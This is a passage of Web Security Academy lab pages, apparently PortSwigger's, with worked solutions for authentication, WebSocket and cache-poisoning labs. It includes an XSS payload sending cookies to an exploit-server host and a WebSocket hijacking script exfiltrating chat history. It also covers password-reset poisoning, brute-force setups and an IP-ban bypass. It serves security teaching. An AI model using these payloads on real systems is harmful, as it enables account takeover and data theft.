                                    option selected. Notice that this sets a
                                    <code>
        stay-logged-in
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Examine this cookie in the
                                        <a href="https://portswigger.net/burp/documentation/desktop/tools/inspector">
                                            Inspector
                                        </a>
                                        panel and notice that it is Base64-encoded. Its decoded value is
                                        <code>
         wiener:51dc30ddc473d43a6011e9ebba6ca770
        </code>
                                        . Study the length and character set of this string and notice that it could be
                                        an MD5 hash. Given that the plaintext is your username, you can make an educated
                                        guess that this may be a hash of your password. Hash your password using MD5 to
                                        confirm that this is the case. We now know that the cookie is constructed as
                                        follows:
                                    </p>
                                    <code class="code-scrollable">
        base64(username+':'+md5HashOfPassword)
       </code>
                                </li>
                                <li>
                                    Log out of your account.
                                </li>
                                <li>
                                    In the most recent
                                    <code>
        GET /my-account
       </code>
                                    , highlight the
                                    <code>
        stay-logged-in
       </code>
                                    cookie parameter and send the request to Burp Intruder.
                                </li>
                                <li>
                                    In Burp Intruder, notice that the
                                    <code>
        stay-logged-in
       </code>
                                    cookie has been automatically added as a payload position. Add your own password as
                                    a single payload.
                                </li>
                                <li>
                                    Under
                                    <strong>
                                        Payload processing
                                    </strong>
                                    , add the following rules in order. These rules will be applied sequentially to each
                                    payload before the request is submitted.
                                    <ul>
                                        <li>
                                            Hash:
                                            <code>
          MD5
         </code>
                                        </li>
                                        <li>
                                            Add prefix:
                                            <code>
          wiener:
         </code>
                                        </li>
                                        <li>
                                            Encode:
                                            <code>
          Base64-encode
         </code>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    As the
                                    <strong>
                                        Update email
                                    </strong>
                                    button is only displayed when you access the
                                    <code>
        /my-account
       </code>
                                    page in an authenticated state, we can use the presence or absence of this button to
                                    determine whether we've successfully brute-forced the cookie. On the
                                    <strong>
                                        Settings
                                    </strong>
                                    tab, add a grep match rule to flag any responses containing the string
                                    <code>
        Update email
       </code>
                                    . Start the attack.
                                </li>
                                <li>
                                    Notice that the generated payload was used to successfully load your own account
                                    page. This confirms that the payload processing rules work as expected and you were
                                    able to construct a valid cookie for your own account.
                                </li>
                                <li>
                                    Make the following adjustments and then repeat this attack:
                                    <ul>
                                        <li>
                                            Remove your own password from the payload list and add the list of
                                            <a
                                                href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                                                candidate passwords
                                            </a>
                                            instead.
                                        </li>
                                        <li>
                                            Change the
                                            <strong>
                                                Add prefix
                                            </strong>
                                            rule to add
                                            <code>
          carlos:
         </code>
                                            instead of
                                            <code>
          wiener:
         </code>
                                            .
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    When the attack is finished, the lab will be solved. Notice that only one request
                                    returned a response containing
                                    <code>
        Update email
       </code>
                                    . The payload from this request is the valid
                                    <code>
        stay-logged-in
       </code>
                                    cookie for Carlos's account.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Offline password cracking
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the
                comment functionality. To solve the lab, obtain Carlos's
                <code>
   stay-logged-in
  </code>
                cookie and use it to crack his password. Then, log in as
                <code>
   carlos
  </code>
                and delete his account from the "My account" page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/151f941feb521716a2b1005d474bcf3f4ad34dee8790c892af3e36c88c22a128?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-offline-password-cracking"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, use your own account to investigate the "Stay logged in"
                                    functionality. Notice that the
                                    <code>
        stay-logged-in
       </code>
                                    cookie is Base64 encoded.
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab, go to the
                                        <strong>
                                            Response
                                        </strong>
                                        to your login request and highlight the
                                        <code>
         stay-logged-in
        </code>
                                        cookie, to see that it is constructed as follows:
                                    </p>
                                    <code>
        username+':'+md5HashOfPassword
       </code>
                                </li>
                                <li>
                                    You now need to steal the victim user's cookie. Observe that the comment
                                    functionality is vulnerable to XSS.
                                </li>
                                <li>
                                    Go to the exploit server and make a note of the URL.
                                </li>
                                <li>
                                    <p>
                                        Go to one of the blogs and post a comment containing the following
                                        <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                                            stored XSS
                                        </a>
                                        payload, remembering to enter your own exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    On the exploit server, open the access log. There should be a
                                    <code>
        GET
       </code>
                                    request from the victim containing their
                                    <code>
        stay-logged-in
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Decode the cookie in Burp Decoder. The result will be:
                                    </p>
                                    <code class="code-scrollable">
        carlos:26323c16d5f4dabff3bb136f2460a943
       </code>
                                </li>
                                <li>
                                    Copy the hash and paste it into a search engine. This will reveal that the password
                                    is
                                    <code>
        onceuponatime
       </code>
                                    .
                                </li>
                                <li>
                                    Log in to the victim's account, go to the "My account" page, and delete their
                                    account to solve the lab.
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    The purpose of this lab is to demonstrate the potential of cracking passwords
                                    offline. Most likely, this would be done using a tool like hashcat, for example.
                                    When testing your clients' websites, we do not recommend submitting hashes of their
                                    real passwords in a search engine.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Password reset poisoning via middleware
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to password reset poisoning. The user
                <code>
   carlos
  </code>
                will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's
                account.

                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
                . Any emails sent to this account can be read via the email client on the exploit server.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/eb59e3d1483ff8122d7fde75e8e54fc95160ec5c56abdf09f3ef419b02939a4c?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-password-reset-poisoning-via-middleware"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, investigate the password reset functionality. Observe that a link
                                    containing a unique reset token is sent via email.
                                </li>
                                <li>
                                    Send the
                                    <code>
        POST /forgot-password
       </code>
                                    request to Burp Repeater. Notice that the
                                    <code>
        X-Forwarded-Host
       </code>
                                    header is supported and you can use it to point the dynamically generated reset link
                                    to an arbitrary domain.
                                </li>
                                <li>
                                    Go to the exploit server and make a note of your exploit server URL.
                                </li>
                                <li>
                                    <p>
                                        Go back to the request in Burp Repeater and add the
                                        <code>
         X-Forwarded-Host
        </code>
                                        header with your exploit server URL:
                                    </p>
                                    <code class="code-scrollable">
        X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                </li>
                                <li>
                                    Change the
                                    <code>
        username
       </code>
                                    parameter to
                                    <code>
        carlos
       </code>
                                    and send the request.
                                </li>
                                <li>
                                    Go to the exploit server and open the access log. You should see a
                                    <code>
        GET /forgot-password
       </code>
                                    request, which contains the victim's token as a query parameter. Make a note of this
                                    token.
                                </li>
                                <li>
                                    Go back to your email client and copy the valid password reset link (not the one
                                    that points to the exploit server). Paste this into the browser and change the value
                                    of the
                                    <code>
        temp-forgot-password-token
       </code>
                                    parameter to the value that you stole from the victim.
                                </li>
                                <li>
                                    Load this URL and set a new password for Carlos's account.
                                </li>
                                <li>
                                    Log in to Carlos's account using the new password to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Password brute-force via password change
                (authentication)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab,
                use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
            </p>
            <ul>
                <li>
                    Your credentials:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Victim's username:
                    <code>
    carlos
   </code>
                </li>
                <li>
                    <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">
                        Candidate passwords
                    </a>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/11cd0613af5142781dc61c2957b8a8e46743d73f803b52c4eb6af5a5a5eb6b0a?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-password-brute-force-via-password-change"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in and experiment with the password change functionality.
                                    Observe that the username is submitted as hidden input in the request.
                                </li>
                                <li>
                                    Notice the behavior when you enter the wrong current password. If the two entries
                                    for the new password match, the account is locked. However, if you enter two
                                    different new passwords, an error message simply states
                                    <code>
        Current password is incorrect
       </code>
                                    . If you enter a valid current password, but two different new passwords, the
                                    message says
                                    <code>
        New passwords do not match
       </code>
                                    . We can use this message to enumerate correct passwords.
                                </li>
                                <li>
                                    Enter your correct current password and two new passwords that do not match. Send
                                    this
                                    <code>
        POST /my-account/change-password
       </code>
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    <p>
                                        In Burp Intruder, change the
                                        <code>
         username
        </code>
                                        parameter to
                                        <code>
         carlos
        </code>
                                        and add a payload position to the
                                        <code>
         current-password
        </code>
                                        parameter. Make sure that the new password parameters are set to two different
                                        values. For example:
                                    </p>
                                    <code class="code-scrollable">
        username=carlos&amp;current-password=Â§incorrect-passwordÂ§&amp;new-password-1=123&amp;new-password-2=abc
       </code>
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Payloads
                                    </strong>
                                    tab, enter the list of passwords as the payload set
                                </li>
                                <li>
                                    On the
                                    <strong>
                                        Settings
                                    </strong>
                                    tab, add a grep match rule to flag responses containing
                                    <code>
        New passwords do not match
       </code>
                                    . Start the attack.
                                </li>
                                <li>
                                    When the attack finished, notice that one response was found that contains the
                                    <code>
        New passwords do not match
       </code>
                                    message. Make a note of this password.
                                </li>
                                <li>
                                    In the browser, log out of your own account and lock back in with the username
                                    <code>
        carlos
       </code>
                                    and the password that you just identified.
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        My account
                                    </strong>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Manipulating WebSocket messages to exploit vulnerabilities
                (websockets)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This online shop has a live chat feature implemented using
                <a href="https://portswigger.net/web-security/websockets">
                    WebSockets
                </a>
                .
            </p>
            <p>
                Chat messages that you submit are viewed by a support agent in real time.
            </p>
            <p>
                To solve the lab, use a WebSocket message to trigger an
                <code>
   alert()
  </code>
                popup in the support agent's browser.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/dddcbacfe04eccc56d7fbf70f27dd50a1732bc533a5f5237a067a80651ef4bab?referrer=%2fweb-security%2fwebsockets%2flab-manipulating-messages-to-exploit-vulnerabilities"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Click "Live chat" and send a chat message.
                                </li>
                                <li>
                                    In Burp Proxy, go to the WebSockets history tab, and observe that the chat message
                                    has been sent via a WebSocket message.
                                </li>
                                <li>
                                    Using the browser, send a new message containing a
                                    <code>
        &lt;
       </code>
                                    character.
                                </li>
                                <li>
                                    In Burp Proxy, find the corresponding WebSocket message and observe that the
                                    <code>
        &lt;
       </code>
                                    has been HTML-encoded by the client before sending.
                                </li>
                                <li>
                                    Ensure that Burp Proxy is configured to intercept WebSocket messages, then send
                                    another chat message.
                                </li>
                                <li>
                                    <p>
                                        Edit the intercepted message to contain the following payload:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 onerror='alert(1)'&gt;
       </code>
                                </li>
                                <li>
                                    Observe that an alert is triggered in the browser. This will also happen in the
                                    support agent's browser.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Cross-site WebSocket hijacking
                (websockets)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This online shop has a live chat feature implemented using
                <a href="https://portswigger.net/web-security/websockets">
                    WebSockets
                </a>
                .
            </p>
            <p>
                To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a
                <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">
                    cross-site WebSocket hijacking attack
                </a>
                to exfiltrate the victim's chat history, then use this gain access to their account.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit
                    server and/or Burp Collaborator's default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a15ec3915bdc09700eea6c9fd20970de0aaf2bfbb87b3e7ec3d8d9800b8e542d?referrer=%2fweb-security%2fwebsockets%2fcross-site-websocket-hijacking%2flab"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Click "Live chat" and send a chat message.
                                </li>
                                <li>
                                    Reload the page.
                                </li>
                                <li>
                                    In Burp Proxy, in the WebSockets history tab, observe that the "READY" command
                                    retrieves past chat messages from the server.
                                </li>
                                <li>
                                    In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request.
                                    Observe that the request has no
                                    <a href="https://portswigger.net/web-security/csrf">
                                        CSRF
                                    </a>
                                    tokens.
                                </li>
                                <li>
                                    Right-click on the handshake request and select "Copy URL".
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and paste the following template into
                                        the "Body" section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Replace
                                    <code>
        your-websocket-url
       </code>
                                    with the URL from the WebSocket handshake (
                                    <code>
        YOUR-LAB-ID.web-security-academy.net/chat
       </code>
                                    ). Make sure you change the protocol from
                                    <code>
        https://
       </code>
                                    to
                                    <code>
        wss://
       </code>
                                    . Replace
                                    <code>
        your-collaborator-url
       </code>
                                    with a payload generated by
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Burp Collaborator
                                    </a>
                                    .
                                </li>
                                <li>
                                    Click "View exploit".
                                </li>
                                <li>
                                    Poll for interactions in the Collaborator tab. Verify that the attack has
                                    successfully retrieved your chat history and exfiltrated it via Burp Collaborator.
                                    For every message in the chat, Burp Collaborator has received an HTTP request. The
                                    request body contains the full contents of the chat message in JSON format. Note
                                    that these messages may not be received in the correct order.
                                </li>
                                <li>
                                    Go back to the exploit server and deliver the exploit to the victim.
                                </li>
                                <li>
                                    Poll for interactions in the Collaborator tab again. Observe that you've received
                                    more HTTP interactions containing the victim's chat history. Examine the messages
                                    and notice that one of them contains the victim's username and password.
                                </li>
                                <li>
                                    Use the exfiltrated credentials to log in to the victim user's account.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
                (websockets)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This online shop has a live chat feature implemented using
                <a href="https://portswigger.net/web-security/websockets">
                    WebSockets
                </a>
                .
            </p>
            <p>
                It has an aggressive but flawed XSS filter.
            </p>
            <p>
                To solve the lab, use a WebSocket message to trigger an
                <code>
   alert()
  </code>
                popup in the support agent's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ul>
                                <li>
                                    If you're struggling to bypass the XSS filter, try out our
                                    <a href="https://portswigger.net/web-security/cross-site-scripting">
                                        XSS labs
                                    </a>
                                    .
                                </li>
                                <li>
                                    Sometimes you can bypass IP-based restrictions using HTTP headers like
                                    <code>
        X-Forwarded-For
       </code>
                                    .
                                </li>
                            </ul>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f745f6c86fd28635cf5bdc4071bcbbd639d2ce9755d8ab435c059fb2c96e90f4?referrer=%2fweb-security%2fwebsockets%2flab-manipulating-handshake-to-exploit-vulnerabilities"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Click "Live chat" and send a chat message.
                                </li>
                                <li>
                                    In Burp Proxy, go to the WebSockets history tab, and observe that the chat message
                                    has been sent via a WebSocket message.
                                </li>
                                <li>
                                    Right-click on the message and select "Send to Repeater".
                                </li>
                                <li>
                                    <p>
                                        Edit and resend the message containing a basic XSS payload, such as:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 onerror='alert(1)'&gt;
       </code>
                                </li>
                                <li>
                                    Observe that the attack has been blocked, and that your WebSocket connection has
                                    been terminated.
                                </li>
                                <li>
                                    Click "Reconnect", and observe that the connection attempt fails because your IP
                                    address has been banned.
                                </li>
                                <li>
                                    <p>
                                        Add the following header to the handshake request to spoof your IP address:
                                    </p>
                                    <code class="code-scrollable">
        X-Forwarded-For: 1.1.1.1
       </code>
                                </li>
                                <li>
                                    Click "Connect" to successfully reconnect the WebSocket.
                                </li>
                                <li>
                                    <p>
                                        Send a WebSocket message containing an obfuscated XSS payload, such as:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src=1 oNeRrOr=alert`1`&gt;
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning with an unkeyed header
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits
                the site's home page. To solve this lab, poison the cache with a response that executes
                <code>
   alert(document.cookie)
  </code>
                in the visitor's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This lab supports the
                                <code>
       X-Forwarded-Host
      </code>
                                header.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/145baf066fe7fe27bb26a1a295e6a58d17ac101777181cc01014c893fdda06c6?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-with-an-unkeyed-header"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, load the website's home page
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the requests and responses that
                                    you generated. Find the
                                    <code>
        GET
       </code>
                                    request for the home page and send it to Burp Repeater.
                                </li>
                                <li>
                                    Add a cache-buster query parameter, such as
                                    <code>
        ?cb=1234
       </code>
                                    .
                                </li>
                                <li>
                                    Add the
                                    <code>
        X-Forwarded-Host
       </code>
                                    header with an arbitrary hostname, such as
                                    <code>
        example.com
       </code>
                                    , and send the request.
                                </li>
                                <li>
                                    Observe that the
                                    <code>
        X-Forwarded-Host
       </code>
                                    header has been used to dynamically generate an absolute URL for importing a
                                    JavaScript file stored at
                                    <code>
        /resources/js/tracking.js
       </code>
                                    .
                                </li>
                                <li>
                                    Replay the request and observe that the response contains the header
                                    <code>
        X-Cache: hit
       </code>
                                    . This tells us that the response came from the cache.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and change the file name to match the path used by the
                                        vulnerable response:
                                    </p>
                                    <code class="code-scrollable">
        /resources/js/tracking.js
       </code>
                                </li>
                                <li>
                                    In the body, enter the payload
                                    <code>
        alert(document.cookie)
       </code>
                                    and store the exploit.
                                </li>
                                <li>
                                    Open the
                                    <code>
        GET
       </code>
                                    request for the home page in Burp Repeater and remove the cache buster.
                                </li>
                                <li>
                                    <p>
                                        Add the following header, remembering to enter your own exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                </li>
                                <li>
                                    Send your malicious request. Keep replaying the request until you see your exploit
                                    server URL being reflected in the response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    To simulate the victim, load the poisoned URL in the browser and make sure that the
                                    <code>
        alert()
       </code>
                                    is triggered. Note that you have to perform this test before the cache expires. The
                                    cache on this lab expires every 30 seconds.
                                </li>
                                <li>
                                    If the lab is still not solved, the victim did not access the page while the cache
                                    was poisoned. Keep sending the request every few seconds to re-poison the cache
                                    until the victim is affected and the lab is solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning with an unkeyed cookie
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home
                page. To solve this lab, poison the cache with a response that executes
                <code>
   alert(1)
  </code>
                in the visitor's browser.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d131a4d5f8a6a7e2ae584e9bc217208c223cad4bac3aed016482305228d68fb2?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-with-an-unkeyed-cookie"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, load the website's home page.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the requests and responses that
                                    you generated. Notice that the first response you received sets the cookie
                                    <code>
        fehost=prod-cache-01
       </code>
                                    .
                                </li>
                                <li>
                                    Reload the home page and observe that the value from the
                                    <code>
        fehost
       </code>
                                    cookie is reflected inside a double-quoted JavaScript object in the response.
                                </li>
                                <li>
                                    Send this request to Burp Repeater and add a cache-buster query parameter.
                                </li>
                                <li>
                                    Change the value of the cookie to an arbitrary string and resend the request.
                                    Confirm that this string is reflected in the response.
                                </li>
                                <li>
                                    <p>
                                        Place a suitable
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        payload in the
                                        <code>
         fehost
        </code>
                                        cookie, for example:
                                    </p>
                                    <code class="code-scrollable">
        fehost=someString"-alert(1)-"someString
       </code>
                                </li>
                                <li>
                                    Replay the request until you see the payload in the response and
                                    <code>
        X-Cache: hit
       </code>
                                    in the headers.
                                </li>
                                <li>
                                    Load the URL in the browser and confirm the
                                    <code>
        alert()
       </code>
                                    fires.
                                </li>
                                <li>
                                    Go back Burp Repeater, remove the cache buster, and replay the request to keep the
                                    cache poisoned until the victim visits the site and the lab is solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning with multiple headers
                (web-cache-poisoning)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A
                user visits the home page roughly once a minute. To solve this lab, poison the cache with a response
                that executes
                <code>
   alert(document.cookie)
  </code>
                in the visitor's browser.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This lab supports both the
                                <code>
       X-Forwarded-Host
      </code>
                                and
                                <code>
       X-Forwarded-Scheme
      </code>
                                headers.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ef8228ac8678117cd722c596ac9f2f9e76bbf7d6d2f09a53ce7cf28d04ccff7a?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-with-multiple-headers"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, load the website's home page.
                                </li>
                                <li>
                                    Go to "Proxy" &gt; "HTTP history" and study the requests and responses that you
                                    generated. Find the
                                    <code>
        GET
       </code>
                                    request for the JavaScript file
                                    <code>
        /resources/js/tracking.js
       </code>
                                    and send it to Burp Repeater.
                                </li>
